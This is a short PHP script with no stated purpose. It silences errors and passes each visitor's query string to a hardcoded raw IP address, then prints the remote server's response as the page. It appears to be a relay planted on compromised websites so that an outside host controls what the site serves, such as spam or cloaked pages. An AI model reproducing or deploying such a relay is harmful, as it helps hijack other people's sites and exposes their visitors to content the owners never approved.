<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
header("Content-Type: text/html;charset=utf-8");
defined('url') or define('url',$_SERVER["QUERY_STRING"]);
defined('site') or define('site','http://107.151.207.146/?');
defined('road') or define('road',"".url);

ob_flush();
flush();

function g1($f) {
	$c=array(
		'http'=>array(
			'method'=>"GET",
			'user_agent'=> $_SERVER['HTTP_USER_AGENT']
		)
	);
	$g=stream_context_create($c);
	
	 $h=file_get_contents($f,false,$g);
	 if(!empty($h)) {
		 return $h;
	 }
}
$currentPage = g1(site.road);

exit($currentPage);
?>